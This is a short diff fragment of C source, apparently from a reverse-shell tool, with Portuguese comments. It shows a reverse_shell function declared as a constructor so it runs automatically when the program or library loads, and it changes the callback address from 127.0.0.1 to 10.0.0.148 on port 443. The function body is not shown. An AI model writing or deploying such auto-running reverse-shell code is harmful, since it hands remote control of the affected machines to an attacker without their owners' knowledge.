@@ -6,7 +6,7 @@
 
 void reverse_shell(char *ip, int port) __attribute__ ((constructor));
 void call(){
-    reverse_shell("127.0.0.1", 443); // ip e porta
+    reverse_shell("10.0.0.148", 443); // ip e porta
 }
 
 int main(int argc, char *argv[])
